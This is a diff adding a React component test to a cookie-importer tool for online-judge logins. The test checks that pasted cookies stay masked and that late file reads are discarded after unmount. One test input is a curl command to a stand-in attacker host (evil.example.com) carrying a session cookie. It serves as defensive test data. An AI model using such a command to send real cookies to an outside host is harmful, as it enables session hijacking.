@@ -1,5 +1,6 @@
 import { useMemo, useState } from 'react';
 import { fireEvent, render, screen } from '@testing-library/react';
+import { vi } from 'vitest';
 import { parseOjCookieInput } from '@/lib/cookie-parser';
 import { CookieImporter } from './cookie-importer';
 
@@ -41,5 +42,40 @@ describe('CookieImporter', () => {
     fireEvent.click(screen.getByRole('button', { name: '清空' }));
     expect(screen.getByTestId('normalized').textContent).toBe('');
     expect((screen.getByLabelText('登录 Cookie（只写不读）') as HTMLTextAreaElement).value).toBe('');
+  });
+
+  it('never reverses masking on destination change and ignores async file reads after unmount', async () => {
+    const onRawChange = vi.fn();
+    let resolveText!: (v: string) => void;
+    const pendingFile = {
+      name: 'cookies.txt',
+      size: 64,
+      text: () => new Promise<string>(resolve => { resolveText = resolve; }),
+    } as unknown as File;
+
+    // 1. Mismatched cURL sealed via bulk paste stays masked even when diagnostics warn
+    const { rerender, unmount, container } = render(
+      <CookieImporter platform="codeforces" rawValue="" onRawChange={onRawChange} />,
+    );
+    const badCurl = `curl 'https://evil.example.com/' -H 'Cookie: JSESSIONID=SECRET_SHOULD_STAY_HIDDEN'`;
+    fireEvent.change(screen.getByLabelText('登录 Cookie（只写不读）'), { target: { value: badCurl } });
+    rerender(<CookieImporter platform="codeforces" rawValue={badCurl} onRawChange={onRawChange} />);
+    expect(screen.queryByLabelText('登录 Cookie（只写不读）')).toBeNull();
+    expect(container.textContent).not.toContain('SECRET_SHOULD_STAY_HIDDEN');
+
+    // Changing destination baseUrl while sealed STILL does NOT unmask the raw value
+    rerender(<CookieImporter platform="codeforces" baseUrl="https://mirror.codeforces.com" rawValue={badCurl} onRawChange={onRawChange} />);
+    expect(screen.queryByLabelText('登录 Cookie（只写不读）')).toBeNull();
+    expect(container.textContent).not.toContain('SECRET_SHOULD_STAY_HIDDEN');
+
+    // 2. Unmounting while file.text() is pending discards callback cleanly
+    onRawChange.mockClear();
+    const fileInput = container.querySelector('input[type="file"]') as HTMLInputElement;
+    fireEvent.change(fileInput, { target: { files: [pendingFile] } });
+    unmount();
+    resolveText('JSESSIONID=LATE_FILE_SECRET');
+    await Promise.resolve();
+    await Promise.resolve();
+    expect(onRawChange).not.toHaveBeenCalled();
   });
 });
